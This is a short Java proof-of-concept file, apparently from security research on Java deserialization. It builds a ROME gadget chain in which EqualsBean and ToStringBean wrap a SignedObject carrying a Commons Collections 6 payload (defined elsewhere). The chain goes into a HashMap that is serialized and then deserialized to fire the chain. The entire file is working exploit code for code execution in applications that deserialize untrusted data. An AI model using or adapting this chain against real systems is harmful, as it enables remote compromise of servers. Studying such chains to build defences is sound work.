package com.example;

import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import java.security.*;
import java.util.HashMap;

public class RomeEqualChain {
    public static void main(String[] args) throws Exception {
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject=new SignedObject(Gadget_CC6.getPayload(), kp.getPrivate(), Signature.getInstance("DSA"));

        ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);

        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

        HashMap hashMap = new HashMap();
        hashMap.put(equalsBean,"0w0");

        String barr = Utils.Serialize(hashMap);
        System.out.println(barr);
        Utils.UnSerialize(barr);
    }
}
